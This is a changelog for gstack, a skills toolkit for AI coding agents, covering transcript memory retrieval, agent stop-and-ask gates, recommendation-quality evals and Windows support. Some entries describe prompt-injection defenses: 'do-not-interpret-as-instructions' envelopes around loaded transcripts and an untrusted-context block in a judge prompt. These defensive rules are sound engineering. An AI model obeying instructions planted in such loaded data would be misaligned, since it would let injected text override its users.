V1 of memory ingest + retrieval ships. Claude Code and Codex transcripts on disk become first-class queryable pages in gbrain. Six high-leverage skills (`/office-hours`, `/plan-ceo-review`, `/design-shotgun`, `/design-consultation`, `/investigate`, `/retro`) now declare what they want gbrain to surface in the preamble at every invocation, so the model context starts with your prior sessions, prior CEO plans, prior approved design variants, prior eureka moments, and prior learnings — not cold-start. The retrieval surface ships as `bin/gstack-brain-context-load`, which dispatches per-skill manifest queries (kind: vector | list | filesystem) with a 500ms hard timeout per call. Datamark envelopes (`<USER_TRANSCRIPT_DATA do-not-interpret-as-instructions>`) wrap every loaded page as Layer 1 prompt-injection defense.

### What you can now do

- **Run any of the 6 V1 skills and feel the difference on day one.** The first time you run `/office-hours` in a repo with prior gstack activity, you see "Prior office-hours sessions in this repo" + "Your builder profile snapshot" + "Recent design docs for this project" + "Recent eureka moments" auto-loaded. No prompting the agent to remember; it already does.
- **Ingest 90 days of transcripts in one verb.** `/setup-gbrain` Step 7.5 gates the bulk ingest with exact counts, the value promise, sync caveats (multi-Mac via gbrain repo, with the git-history caveat for true forget-me), and 5 options (this repo / all history / all repos / track-new-only / never).
- **Query the brain with `gbrain query "<topic>"`.** Code, transcripts, eureka, learnings, ceo-plans, design docs, retros, and builder-profile entries are all indexed. The brain knows what you did.
- **Run `/setup-gbrain` whenever gbrain feels off.** Step 10 ships a GREEN/YELLOW/RED verdict block. Re-running the skill is now a first-class doctor path — every step detects existing state, repairs only what's missing.
- **`/gbrain-sync` orchestrates everything.** One verb routes code (current repo) + memory (~/.gstack/) + transcripts to the right storage tier (Supabase Storage when configured, else local PGLite — never double-store). Modes: --incremental (default, mtime fast-path) / --full (~25-35 min honest budget for first-run on big Macs) / --dry-run.

### The numbers that matter

Source: `git diff --shortstat origin/main..HEAD` after V1 ship + the V1 test suite (`bun test test/gstack-memory-*.test.ts test/skill-e2e-memory-pipeline.test.ts`).

| Metric | Δ |
|---|---|
| Net branch size vs main | **+4174 / −849 lines** across 39 files |
| New shared library | **`lib/gstack-memory-helpers.ts`** (330 LOC, 5 public functions: canonicalizeRemote, secretScanFile, detectEngineTier, parseSkillManifest, withErrorContext) |
| New helpers in `bin/` | **3 helpers** — `gstack-memory-ingest` (580 LOC), `gstack-gbrain-sync` (270 LOC), `gstack-brain-context-load` (420 LOC) |
| Skills with V1 gbrain manifests | **6 skills** — `/office-hours`, `/plan-ceo-review`, `/design-shotgun`, `/design-consultation`, `/investigate`, `/retro` |
| Memory types ingested | **8 types** — transcript (Claude Code + Codex), eureka, learning, timeline, ceo-plan, design-doc, retro, builder-profile-entry |
| Tests added | **65 new tests** — 22 helpers + 15 ingest + 8 sync + 10 context-load + 10 E2E pipeline |
| New /setup-gbrain steps | **2 steps** — Step 7.5 (transcript ingest gate with 5-option AskUserQuestion) + Step 10 (GREEN/YELLOW/RED idempotent doctor verdict) |
| New user-facing reference | **`setup-gbrain/memory.md`** — what gets ingested, what stays local, secret scanning via gitleaks, querying, deleting, recovery cases |
| Manifest schema | **`gbrain.schema: 1`**, validated at gen-skill-docs time; 3 query kinds (vector / list / filesystem) with kind-specific required fields |
| MCP-call timeout per query | **500ms** hard cap; preamble never blocks > 2s on gbrain issues |
| Datamark envelope wrap | **per-page** (not per-message) — single envelope around rendered body |

### What this means for builders

You stop describing your past work to the agent. The agent already knows. Run `/office-hours` and the "Welcome back, last time you were on X" beat is sourced from data. Run `/investigate` and it opens with "have we hit this bug class before?" instead of cold-start. Run `/design-shotgun` and the variants regenerate from your taste, not generic defaults.

The storage architecture lands in V1: curated memory rides the existing brain-sync git pipeline; code and transcripts route to Supabase Storage when configured (multi-Mac native) or stay local on PGLite-only Macs. **Never double-store.** Decision rule from D2 (sync by default) survives a CEO review and Codex outside-voice challenge: the value loop (ingest → retrieve → better decisions) requires multi-Mac to feel real.

V1 is **Goldilocks** scope per CEO D18 (Codex F10 strategic challenge): the value loop closes on day one. V1.5 P0 follow-ups capture: `/gbrain-sync --watch` daemon (deferred per F3 invariant), `mcp__gbrain__code_search` MCP tool (cross-repo coordination), `gbrain: default` one-line manifest opt-in (per F1 frontmatter passthrough is bigger than estimated), agent-agnostic `gbrain context` CLI, brain-trajectory observability + weekly digest, classifier-based prompt-injection defense (per F5 ONNX integration), salience MCP server-side promotion. All documented in the plan's V1.5 TODOs.

### Itemized changes

#### Added — Foundation

- `lib/gstack-memory-helpers.ts` — shared module imported by all V1 helpers. canonicalizeRemote (handles https/ssh/git@/.git/quotes/multi-segment), secretScanFile (gitleaks wrapper with discriminated `scanner: "gitleaks" | "missing" | "error"` return), detectEngineTier (cached 60s), parseSkillManifest, withErrorContext (async-aware error logging to `~/.gstack/.gbrain-errors.jsonl`).

#### Added — Ingest pipeline

- `bin/gstack-memory-ingest` — walks `~/.claude/projects/*/`, `~/.codex/sessions/YYYY/MM/DD/`, and `~/.gstack/` artifacts (eureka, learnings, timeline, ceo-plans, design-docs, retros, builder-profile). Modes: --probe / --incremental (default, mtime fast-path) / --bulk. Tolerant JSONL parser handles truncated last lines (D10 partial-flag). State at `~/.gstack/.transcript-ingest-state.json` with schema_version: 1, backup-on-mismatch + JSON-corrupt recovery. gitleaks runs on every page before put_page (D19). --no-write flag for tests + dry-runs (also via `GSTACK_MEMORY_INGEST_NO_WRITE=1`).
- `bin/gstack-gbrain-sync` — unified sync verb. Orchestrates 3 stages: code import → memory ingest → curated git push. Modes: --incremental / --full / --dry-run. State at `~/.gstack/.gbrain-sync-state.json` (LOCAL per ED1) with per-stage outcomes. --code-only / --no-code / --no-memory / --no-brain-sync for selective stage disable.

#### Added — Retrieval surface

- `bin/gstack-brain-context-load` — V1 retrieval surface. Dispatches per-skill manifest queries by kind (vector via `gbrain query`, list via `gbrain list_pages`, filesystem via local glob). 500ms hard timeout per MCP call. Datamark envelope per page. Layer 1 default fallback with 3 sections (recent transcripts + recent curated + skill-name-matched timeline) all carrying explicit `repo: {repo_slug}` filter (F7 cleanup). Template var substitution: {repo_slug}, {user_slug}, {branch}, {skill_name}, {window}.

#### Added — Skill manifests (6 V1 skills)

- `office-hours/SKILL.md.tmpl` — 4 queries (prior-sessions list + builder-profile fs + design-doc-history fs + prior-eureka fs)
- `plan-ceo-review/SKILL.md.tmpl` — 3 queries (prior-ceo-plans fs + recent-design-docs fs + recent-reviews list)
- `design-shotgun/SKILL.md.tmpl` — 3 queries (prior-approved-variants fs + DESIGN.md fs + recent-design-docs fs)
- `design-consultation/SKILL.md.tmpl` — 3 queries (existing-DESIGN.md fs + prior-design-decisions fs + brand-guidelines list)
- `investigate/SKILL.md.tmpl` — 3 queries (prior-investigations list + project-learnings fs + recent-eureka fs)
- `retro/SKILL.md.tmpl` — 3 queries (prior-retros fs + recent-timeline fs + recent-learnings fs)

#### Added — setup-gbrain idempotent doctor + ref doc

- `setup-gbrain/SKILL.md.tmpl` Step 7.5 — Transcript & memory ingest gate. Probe → silent bulk if < 200 sessions / 100MB → AskUserQuestion with 5-option gate otherwise (this repo last 90d / all history / all repos / incremental / never).
- `setup-gbrain/SKILL.md.tmpl` Step 10 — GREEN/YELLOW/RED verdict block. Re-running /setup-gbrain is now first-class doctor path with detect→repair→report rows for CLI / Engine / doctor / MCP / Repo policy / Code import / Memory sync / Transcripts / CLAUDE.md / Smoke.
- `setup-gbrain/memory.md` — user-facing reference covering what gets ingested + what stays local + secret scanning + storage tiering + querying + deleting + how the agent uses it + recovery cases.

#### Added — Tests

- `test/gstack-memory-helpers.test.ts` — 22 unit tests covering all 5 public helpers
- `test/gstack-memory-ingest.test.ts` — 15 tests covering CLI surface, --probe with all source types, state file lifecycle, schema mismatch + JSON corrupt backup-on-error, truncated JSONL handling
- `test/gstack-gbrain-sync.test.ts` — 8 tests covering --help, unknown flag rejection, --dry-run preview, --no-code stage skip, state file lifecycle, stage results recorded
- `test/gstack-brain-context-load.test.ts` — 10 tests covering CLI surface, default fallback, manifest dispatch, datamark envelope wrap, render_as template substitution, unresolved template var skip, --quiet suppression, graceful gbrain-CLI-absence
- `test/skill-e2e-memory-pipeline.test.ts` — 10 E2E tests exercising the full Lane A → B → C value loop with 8 fixture file types

#### Changed

- `package.json` version 1.25.1.0 → 1.26.0.0
- `VERSION` 1.25.1.0 → 1.26.0.0

#### For contributors

- The plan file at `/Users/garrytan/.claude/plans/ok-actually-lets-go-luminous-thacker.md` (~890 lines) is the canonical V1 design source, including office-hours findings, CEO review expansions (6 cherry-picks accepted, 1 reverted+replaced), Codex outside-voice 10 findings (F1-F10 each resolved or deferred), eng review additions (ED1 + ED2 + 6 auto-applied implementation specs), and V1.5 P0 TODOs section with full handoff context.
- Manifest schema is versioned (`gbrain.schema: 1`); future format changes bump the schema and require explicit migration. gen-skill-docs validates the schema at build time (kind / required fields per kind / template var resolution / unique IDs).
- Lane D (cross-repo `gbrain restore-from-sync` with atomic swap + 7-day .bak retention per D11) is documented as V1.5 P0 TODO — gstack repo cannot write to gbrain CLI repo.
- The retrieval surface helper signature is V1.5-promotion-stable: when V1.5 ships server-side `mcp__gbrain__get_recent_salience` / `find_anomalies` MCP tools, the helper switches its internals from 4-call composition to a single MCP call without changing the manifest format or any skill template.
- gitleaks vendoring is a V1.0.1 follow-up; for V1.0, the helper expects gitleaks on PATH and warns once if missing. `brew install gitleaks` on macOS gets you covered until the vendored binary ships.

## [1.25.1.0] - 2026-05-01

## **Office-hours stops at Phase 4 architectural forks. AskUserQuestion evals — and `/codex` synthesis — now grade the "because" clause.**

When you run `/office-hours` in builder mode and it reaches Phase 4 (Alternatives Generation), the agent now actually asks you to pick between A/B/C instead of writing "Recommendation: C because..." in chat prose and proceeding straight to the design doc. The previous Phase 4 footer was soft prose ("Present via AskUserQuestion. Do NOT proceed without user approval"); the new one matches the hard `STOP.` pattern from `plan-ceo-review`'s 0C-bis gate, names the blocked next steps (Phase 4.5 / Phase 5 / Phase 6 / design-doc generation), and rejects the "clearly winning approach so I'll just apply it" reasoning.

Format-compliance evals on AskUserQuestion now do more than confirm a `Recommendation:` line exists. A new Haiku 4.5 judge grades the "because <reason>" clause on a 1-5 substance rubric: 5 = specific tradeoff vs an alternative; 3 = generic ("because it's faster"); 1 = boilerplate. Tests fail at threshold ≥ 4, catching the exact failure mode where agents write "Recommendation: B because it's better" — present but useless.

The same rigor extends to **cross-model synthesis surfaces** that previously emitted prose without a structured recommendation. `/codex review`, `/codex challenge`, `/codex consult`, and the Claude adversarial subagent (plus Codex's adversarial pass in `/ship` Step 11) now MUST emit a canonical `Recommendation: <action> because <reason>` line at the end of their synthesis. The reason must compare against alternatives (a different finding, fix-vs-ship, fix-order tradeoff) — generic synthesis ("because adversarial review found things") fails the format check.

### What you can now do

- **Run `/office-hours` builder mode in Conductor and trust the Phase 4 gate.** The architectural fork (server-side vs client-side vs hybrid, or whatever shape your project has) actually surfaces for you to decide. The agent stops cold at Phase 4 until you respond.
- **Catch weak recommendations in CI.** Periodic-tier evals on `/plan-ceo-review`, `/plan-eng-review`, and `/office-hours` now grade recommendation substance via Haiku 4.5 (~$0.005/judge call). Generic "because it's faster" reasoning fails the gate.
- **Get an actionable line out of every `/codex` run.** Review, challenge, and consult modes all now end with `Recommendation: <action> because <reason>` — one line you can act on without re-reading the full Codex transcript. Same for the Claude adversarial subagent and Codex adversarial pass that auto-run in `/ship` Step 11.

### The numbers that matter

Source: paid evals run on this branch (`EVALS=1 EVALS_TIER=periodic bun test ...`). Six recommendation-quality evals: 4 plan-format + 1 office-hours Phase 4 + 1 fixture sanity test.

| Metric | Before | After | Δ |
|---|---|---|---|
| Recommendation-quality eval coverage | regex only (`Choose` literal required) | regex + Haiku 4.5 judge | substance-graded |
| Office-hours Phase 4 silent auto-decide | possible | regression test gates | trapped |
| Phase 4 eval cost per run | n/a (test didn't exist) | $0.36, 4 turns, 36s, substance 5 | new |
| Plan-format judge threshold | none (regex only) | `reason_substance >= 4` | catches generic |
| Test fixture coverage for judge rubric | manual revert/re-apply sabotage | 13 hand-graded fixtures | deterministic |
| `judgeRecommendation` branch coverage | n/a | 14/14 (100%) | new |

### What this means for builders

If you've been running `/office-hours` in builder mode and noticed your design doc had architectural choices baked in that you didn't make, that was the bug. Phase 4's footer wasn't strong enough to keep the agent from rationalizing through the gate. After upgrading, the agent stops, asks, and waits.

If you've been writing skill templates with `Recommendation: <choice> because <reason>` and noticing the agent sometimes ships generic reasons, the new judge catches that. Run the format-regression evals against your skill (or copy the pattern into your own E2E tests) and Haiku will rate the because-clause substance. Generic reasons fail at threshold 4; specific tradeoff reasons (level 5) pass.

### Itemized changes

#### Added — judgeRecommendation helper + regression tests

- `test/helpers/llm-judge.ts` gets `judgeRecommendation()` plus the `RecommendationScore` interface. Layered design: deterministic regex parses `present` / `commits` / `has_because` (no LLM call needed for booleans, and the function returns substance=1 immediately when the because-clause is missing). Haiku 4.5 grades only the 1-5 `reason_substance` axis on a tight rubric scoped to the because-clause itself with the surrounding menu as untrusted context.
- `callJudge()` generalized with an optional model arg defaulting to Sonnet 4.6. Existing callers (`judge`, `outcomeJudge`, `judgePosture`) unchanged.
- `test/skill-e2e-office-hours-phase4.test.ts` (new, periodic-tier) — SDK + `captureInstruction` regression test for the Phase 4 silent-auto-decide bug. Extracts only the AskUserQuestion Format + Phase 4 sections from `office-hours/SKILL.md` (per CLAUDE.md "extract, don't copy") rather than copying the full skill, saving ~30% per run on Opus tokens.
- `test/llm-judge-recommendation.test.ts` (new, periodic-tier) — 13 hand-graded fixtures covering substance 5 / 4 / 3 / 1, no-because, no-recommendation, and 6 distinct hedging forms. Replaces the original "manually inject bad text into a captured file and revert the SKILL template" sabotage step with deterministic negative coverage.
- `test/helpers/e2e-helpers.ts` gets `assertRecommendationQuality()` + `RECOMMENDATION_SUBSTANCE_THRESHOLD` constant. Collapses the 5x duplicated 22-line judge-assertion block (4 plan-format cases + 1 Phase 4) into a single helper call.

#### Changed — office-hours Phase 4 STOP gate

- `office-hours/SKILL.md.tmpl` Phase 4 footer rewritten with a hard `**STOP.**` token (matching `plan-ceo-review/SKILL.md.tmpl:248-252`'s 0C-bis pattern), named blocked next steps (Phase 4.5 Founder Signal Synthesis, Phase 5 Design Doc, Phase 6 Closing, design-doc generation), and an explicit anti-rationalization line ("A 'clearly winning approach' is still an approach decision"). Preserves the preamble's no-variant fallback path explicitly (write `## Decisions to confirm` to the plan file + ExitPlanMode).
- `test/skill-e2e-plan-format.test.ts` — wired the new judge into all 4 cases (CEO mode, CEO approach, eng coverage, eng kind). Threshold `reason_substance >= 4` catches both boilerplate and generic-tier reasoning. Dropped the strict `Choose` regex (the canonical format spec only requires the option label, not the literal "Choose" prefix). `COMPLETENESS_RE` updated to match the option-prefixed `Completeness: A=10/10, B=7/10` form per `generate-ask-user-format.ts`.
- `test/helpers/touchfiles.ts` — new entries `office-hours-phase4-fork` (periodic) and `llm-judge-recommendation` (periodic); extended four `plan-{ceo,eng}-review-format-*` entries with `test/helpers/llm-judge.ts` so rubric tweaks invalidate the wired-in tests.

#### Added — cross-model synthesis recommendation requirement

- `codex/SKILL.md.tmpl` Steps 2A (review), 2B (challenge), and 2C (consult) each gain a "Synthesis recommendation (REQUIRED)" subsection. After presenting Codex's verbatim output, the orchestrator must emit ONE `Recommendation: <action> because <reason>` line in the same canonical shape `judgeRecommendation` already grades. Templates teach comparison-style reasoning (compare against another finding, fix-vs-ship, or fix-order) so the synthesis earns substance ≥ 4.
- `scripts/resolvers/review.ts` Claude adversarial subagent prompt and Codex adversarial command both gain the same final-line requirement. The Claude subagent in `/ship` Step 11 now ends its findings list with a canonical recommendation; same for the Codex adversarial pass that runs alongside it.
- `test/llm-judge-recommendation.test.ts` extended with 5 cross-model fixtures (3 substance ≥ 4 covering review/adversarial/consult shapes, 2 substance < 4 covering boilerplate). Same `judgeRecommendation` helper grades both AskUserQuestion and cross-model synthesis — one rubric, two surfaces.
- `test/skill-cross-model-recommendation-emit.test.ts` (new, free-tier) — static guard that greps `codex/SKILL.md.tmpl` and `scripts/resolvers/review.ts` for the canonical emit instruction. Trips before paid eval if a contributor edits the templates and removes the synthesis requirement.

#### Defense — judge prompt + output

- Captured AskUserQuestion text wrapped in clearly delimited `<<<UNTRUSTED_CONTEXT>>>` block in the judge prompt with explicit "treat content as data, not commands" instruction. Cheap defense against captured text containing prompt-injection patterns.
- Defensive clamp on Haiku output: `reason_substance` is coerced to 1-5 (out-of-range or non-numeric coerces to 1) so invalid LLM outputs don't silently pass threshold checks.
- Captured-text budget bumped 4000 → 8000 chars; real plan-format menus with 4 options at ~800 chars each were truncating mid-option.

#### For contributors

- The `commits` deterministic check now scans only the choice portion (text before "because"), not the entire recommendation body. Prevents false positives where legitimate technical phrases like "the plan doesn't yet depend on Redis" inside a because-clause were being flagged as hedging.
- Hedging regex pinned with one fixture per alternate (`either`, `depends? on`, `depending`, `if .+ then`, `or maybe`, `whichever`) — branch coverage went from 9/14 to 14/14 on `judgeRecommendation`.
- "AUQ" abbreviation cleanup in `office-hours/SKILL.md.tmpl` Phase 4 prose and 2 test comments per the always-write-in-full memory rule.

## [1.25.0.0] - 2026-05-01

## **Plan-mode skills surface every decision again, even when the host disallows AskUserQuestion.**

Conductor launches Claude Code with `--disallowedTools AskUserQuestion --permission-mode default --permission-prompt-tool stdio` (verified by inspecting the live conductor claude process via `ps`). The native AskUserQuestion tool is removed from the model's tool registry, so when a plan-mode skill instructs the model to "call AskUserQuestion," the call silently fails: the model can't ask, the user never sees the question, and the skill auto-proceeds without input. The whole interactive premise of `/plan-ceo-review`, `/plan-eng-review`, `/plan-design-review`, `/plan-devex-review`, `/autoplan`, and `/office-hours` was broken in any Conductor session.

The fix is preamble guidance, not skill-template surgery. A new `Tool resolution` section in `scripts/resolvers/preamble/generate-ask-user-format.ts` tells the model to check its tool list and prefer any `mcp__*__AskUserQuestion` variant (e.g. `mcp__conductor__AskUserQuestion`) over the native tool. Hosts that disable native AskUserQuestion register their own MCP variant; the variant takes the same questions/options shape and the host renders the prompt through its own UI surface. If neither variant is callable, the model falls back to writing a `## Decisions to confirm` section into the plan file and calling ExitPlanMode — plan-mode's native "Ready to execute?" confirmation surfaces the decisions through TTY UI. **Never silently auto-decide.**

Six gate-tier real-PTY regression tests reproduce the exact Conductor flag set (`extraArgs: ['--disallowedTools', 'AskUserQuestion']`) for every plan-mode skill, plus a periodic-tier eval that protects the legitimate `/plan-tune` AUTO_DECIDE opt-in path from being broken by the fix. The harness gains a new `'auto_decided'` outcome and whitespace-tolerant detectors that survive TTY cursor-positioning escape sequences (which `stripAnsi` removes without leaving spaces, collapsing "ready to execute" to "readytoexecute").

### What you can now do

- **Use plan-mode review skills in Conductor.** Open a Conductor workspace, run `/plan-ceo-review` against a plan, and the scope-mode question actually appears for you to answer. Same for `/plan-eng-review`, `/plan-design-review`, `/plan-devex-review`, `/autoplan`'s premise gate, and `/office-hours`.
- **Stay in control under `--disallowedTools` without writing template overrides.** The Tool resolution section sits at preamble position 1 in every tier-≥2 skill; new hosts that disable native AUQ via the same pattern get the fix transparently as long as they register an MCP variant.
- **Opt-in to AUTO_DECIDE without losing the regression guard.** `/plan-tune` users who set `never-ask` for specific questions keep auto-pick under Conductor flags; the periodic-tier `auto-decide-preserved` eval protects this path.

### The numbers that matter

Source: `ps -p <conductor-claude-pid> -o args=` for the regression mechanism (verified primary source). 6 new gate-tier regression cases + 1 periodic-tier AUTO_DECIDE eval; coverage in `test/skill-e2e-plan-{ceo,eng,design,devex}-plan-mode.test.ts` (parameterized inline) + `test/skill-e2e-{autoplan,office-hours}-auto-mode.test.ts` (standalone) + `test/skill-e2e-auto-decide-preserved.test.ts` (periodic).

| Surface | Shape |
|---|---|
| Skills that regain interactivity in Conductor | 6 (`/plan-ceo-review`, `/plan-eng-review`, `/plan-design-review`, `/plan-devex-review`, `/autoplan`, `/office-hours`) |
| New gate-tier regression test cases | 6 (one per skill; `--disallowedTools AskUserQuestion` parameterized) |
| New periodic-tier eval | 1 (`auto-decide-preserved`, protects `/plan-tune` opt-in path) |
| New `ClassifyResult` outcome | `auto_decided` — TTY shows "Auto-decided … (your preference)" |
| New `runPlanSkillObservation` parameter | `extraArgs?: string[]` — plumbs raw flags to spawned `claude` |
| Preamble resolvers touched | 2 (`generate-ask-user-format.ts`, `generate-completion-status.ts`) |
| SKILL.md files regenerated | 41 |
| `classifyVisible` branch order | `silent_write` → `auto_decided` → `plan_ready` → `asked` (each more specific than the next) |
| Whitespace-tolerant detectors | `isPlanReadyVisible`, `isAutoDecidedVisible` (defeats stripAnsi cursor-positioning collapse) |
| Verified by | `ps -p <conductor-claude-pid> -o args=` showing `--disallowedTools AskUserQuestion --permission-mode default` |

### What this means for builders

If you ran `/plan-ceo-review` or any plan-mode review skill in Conductor before this release, the skill silently produced a plan you didn't shape — the scope-mode question, expansion proposals, and per-section STOPs never reached you. After upgrading, the skill stops for every gate the template defines. The fix is in the preamble, so you don't update skill templates yourself — just upgrade gstack and the next plan review you run honors your input.

If you opted into auto-deciding specific questions via `/plan-tune`, the periodic eval guards that path. The fix is "prefer MCP variant when registered," not "force every question to surface" — your `never-ask` preferences still auto-pick, the AUTO_DECIDE annotation still renders, nothing changes for opt-in users.

The gstack-side regression test surface now mirrors what real users hit. Each plan-mode test file gained a second `test()` block that sets `extraArgs: ['--disallowedTools', 'AskUserQuestion']` and asserts the AskUserQuestion still surfaces. Builds on v1.21.1.0's `classifyVisible()` extraction — the new auto-decided branch slots in cleanly between silent_write and plan_ready.

### Itemized changes

#### Added — Tool resolution preamble

- `scripts/resolvers/preamble/generate-ask-user-format.ts` gets a new `### Tool resolution (read first)` section at the top of the AskUserQuestion Format block. Tells the model: AskUserQuestion can resolve to two tools at runtime (host MCP variant or native); prefer any `mcp__*__AskUserQuestion` variant in the tool list over native; hosts may disable native via `--disallowedTools AskUserQuestion` (Conductor does this by default); same questions/options shape and decision-brief format applies to the MCP variant. Includes a fallback path when neither variant is callable: write the decision into the plan file as `## Decisions to confirm` + ExitPlanMode.
- `scripts/resolvers/preamble/generate-completion-status.ts` (the plan-mode-info block at preamble position 1) updated to point at the Tool resolution section: AskUserQuestion satisfies plan mode's end-of-turn requirement for "any variant," with the plan-file fallback for the no-variant case.

#### Added — regression tests

- 4 inline `test()` blocks added to `test/skill-e2e-plan-{ceo,eng,design,devex}-plan-mode.test.ts`. Each spawns claude with `extraArgs: ['--disallowedTools', 'AskUserQuestion']` and asserts the skill still surfaces the question — pass envelope `['asked', 'plan_ready']` (the latter covers the plan-file fallback flow), failure signals are `'auto_decided'` (caught explicitly) plus the standard silent_write/exited/timeout.
- `test/skill-e2e-autoplan-auto-mode.test.ts` (new). Asserts autoplan's first non-auto-decided gate (Phase 1 premise confirmation) still surfaces. Autoplan auto-decides intermediate questions BY DESIGN, so the test scopes to gates the user MUST see.
- `test/skill-e2e-office-hours-auto-mode.test.ts` (new). Asserts office-hours' startup-vs-builder mode AskUserQuestion still surfaces.
- `test/skill-e2e-auto-decide-preserved.test.ts` (new, periodic-tier). Sets up an isolated `GSTACK_HOME` tmpdir, writes `question_tuning=true` + a `never-ask` preference for `plan-ceo-review-mode` (source `'plan-tune'`), runs `/plan-ceo-review` under `--disallowedTools AskUserQuestion`, asserts outcome is NOT `'asked'` (the model honored the opt-in).

#### Changed — PTY harness

- `test/helpers/claude-pty-runner.ts`: `runPlanSkillObservation` accepts new optional `extraArgs?: string[]` (plumbs straight through to `launchClaudePty`, which already supported the field). `ClassifyResult` gains `'auto_decided'` outcome plus `isAutoDecidedVisible(visible)` detector that matches the AUTO_DECIDE preamble template (`Auto-decided … (your preference)`). `classifyVisible` branch order extended to `silent_write → auto_decided → plan_ready → asked` so an upstream auto-decide isn't masked by a downstream plan-mode confirmation.
- Whitespace-tolerant detection: `isPlanReadyVisible` and `isAutoDecidedVisible` now test both spaced and whitespace-collapsed forms of their target phrases. `stripAnsi` removes cursor-positioning escapes (`\x1b[40C`) without replacing them with spaces, so "ready to execute" can come through as "readytoexecute" — the spaced regex would miss it.

#### Changed — touchfiles

- `test/helpers/touchfiles.ts`: existing `plan-X-review-plan-mode` entries gain `scripts/resolvers/question-tuning.ts` and `scripts/resolvers/preamble/generate-ask-user-format.ts` as touchfile dependencies, so AUTO_DECIDE-bearing resolver changes correctly invalidate the regression cases.
- New entries: `autoplan-auto-mode` (gate), `office-hours-auto-mode` (gate), `auto-decide-preserved` (periodic).
- `test/touchfiles.test.ts`: count of tests selected by `plan-ceo-review/SKILL.md` updates from 19 to 21 to cover the new entries that depend on `plan-ceo-review/**`.

#### For contributors

- The PTY harness's `auto_decided` outcome is a defense-in-depth signal: it fires on the AUTO_DECIDE preamble template wording, which is non-deterministic. Treat it as evidence of a regression, not a hard contract.
- The Tool resolution section is the surgical fix site for any future host that disables native AUQ similarly. The pattern: register a `mcp__<host>__AskUserQuestion` MCP tool; the gstack preamble already tells the model to prefer it. No skill-template changes needed per-host.
- `auto-decide-preserved` runs in an isolated `GSTACK_HOME` tmpdir to avoid mutating the developer's real `~/.gstack` state. When debugging, set `GSTACK_HOME` manually to a scratch dir and run the same setup the test does (`gstack-config set question_tuning true`, then `gstack-question-preference --write`).

## [1.24.0.0] - 2026-04-30

## **Cross-platform hardening. Mac + Linux full, curated Windows lane added.**

v1.24.0.0 ports the McGluut fork's portability work into upstream and adds a curated Windows test job that actually runs green. `bin/gstack-paths` consolidates state-root resolution behind one helper sourced via `eval "$(...)"` from skill bash blocks; eight skills (`careful`, `freeze`, `guard`, `unfreeze`, `investigate`, `context-save`, `context-restore`, `learn`, `office-hours`, `plan-tune`, `codex`) move off inline `${CLAUDE_PLUGIN_DATA:-...}` chains. `Bun.which()` replaces 75 lines of fork-side PATH-resolution code in a new `browse/src/claude-bin.ts` wrapper, wired through five hardcoded `claude` spawn sites. A new `windows-free-tests` GitHub Actions job runs a curated 103-test subset on `windows-latest` plus targeted resolver tests; `evals.yml` stays Linux-container as it should. `AGENTS.md` and `docs/skills.md` sync to the live skill inventory (40+ skills, was 21); `/debug` → `/investigate`, missing skills added, stale `<5s` `bun test` claim dropped. Hardening direction credited to the McGluut fork.

### The numbers that matter

Branch totals come from `git diff --shortstat origin/main..HEAD` after every lane lands. Curation numbers come from `bun run scripts/test-free-shards.ts --windows-only --list`.

| Metric | Δ |
|---|---|
| New shared resolvers | **2 modules** — `bin/gstack-paths` (61 LOC), `browse/src/claude-bin.ts` (73 LOC) |
| Inline state-root chains consolidated | **8 skills** (was 5 in initial scope; 3 more found during T1) |
| Hardcoded `claude` spawn sites rewired | **5 sites** — `security-classifier.ts:396`, `:496`, `preflight-agent-sdk.ts`, `helpers/providers/claude.ts`, `helpers/agent-sdk-runner.ts` |
| Fork's 95-LOC `claude-bin.ts` reimplementation | **−75 lines** — replaced by `Bun.which()` + 18 LOC of override+args wrapping |
| Windows-safe curated subset | **103 of 128 free tests** (80%) run on `windows-latest`; 25 excluded with reasons |
| New tests added | **+31 tests** — gstack-paths (8), claude-bin (9), test-free-shards (14) |
| New invariant tests | **+3** — private-path leak detector + 2 doc-inventory cross-checks in `test/skill-validation.test.ts` |
| Skill inventory documented | **40+ skills** in AGENTS.md + docs/skills.md (was 21 in AGENTS.md; `/debug` → `/investigate`) |
| Free test suite | **318 pass, 0 fail** (`bun test test/skill-validation.test.ts`) |

| Component | Coverage |
|---|---|
| `bin/gstack-paths` | 8 unit tests covering all three fallback chains |
| `browse/src/claude-bin.ts` | 9 unit tests including the override-PATH-resolution case the fork's version got wrong |
| `scripts/test-free-shards.ts` | 14 unit tests covering enumeration, sharding, and Windows-fragility detection |

### What this means for builders

**Plugin installs work.** If you install gstack as a Claude Code plugin, `CLAUDE_PLUGIN_DATA` and `CLAUDE_PLANS_DIR` now flow through every skill's bash blocks. Previously eight skills hardcoded `${GSTACK_HOME:-$HOME/.gstack}` inline; now they all source `bin/gstack-paths` and pick up the plugin-managed roots automatically. No more "plugin install can't find its own state" footgun.

**Windows is a real lane.** A `windows-free-tests` GitHub Actions job runs 103 curated tests on `windows-latest` plus targeted Claude resolver tests. The curation script (`scripts/test-free-shards.ts --windows-only`) excludes tests that hardcode `/bin/bash`, `sh -c`, or raw `/tmp/` paths — those exclusions are tracked as a follow-up TODO since they're the gap between "curated lane" and "full Windows parity." The setup script (`./setup`) still requires Git Bash or MSYS on Windows; native PowerShell support is a future expansion explicitly named in `AGENTS.md`. No "all green" overclaim — the headline says "curated Windows lane" because that's what this release delivers.

**Override the claude binary.** Set `GSTACK_CLAUDE_BIN=wsl` plus `GSTACK_CLAUDE_BIN_ARGS='["claude"]'` and every gstack call site routes Claude through WSL. Three shared resolution layers — `Bun.which()` for the platform handling, a thin wrapper for the override + arg-prefix logic, and five wired-through call sites — eliminate the "works on Mac, fails on Windows" failure mode for the security classifier, the preflight check, the LLM judge, and the agent SDK harness.

**The fork loop reads.** McGluut shipped three commits of real hardening work without filing a PR upstream. We read it, kept the engineering, dropped the framing, and credited where credit is due. Future forks: the contribution path is `git remote add` + open a PR; the take here is the proof that we read what's out there.

### Itemized changes

#### Added

- `bin/gstack-paths`: bash helper that resolves `GSTACK_STATE_ROOT`, `PLAN_ROOT`, `TMP_ROOT` with explicit fallback chains. Sourced via `eval "$(~/.claude/skills/gstack/bin/gstack-paths)"`. Honors `GSTACK_HOME` → `CLAUDE_PLUGIN_DATA` → `$HOME/.gstack` → `.gstack`; `GSTACK_PLAN_DIR` → `CLAUDE_PLANS_DIR` → `$HOME/.claude/plans` → `.claude/plans`; `TMPDIR` → `TMP` → `.gstack/tmp`. Best-effort `mkdir -p` on tmp root; never fails the eval. Pattern matches existing `bin/gstack-slug` and `bin/gstack-codex-probe`.
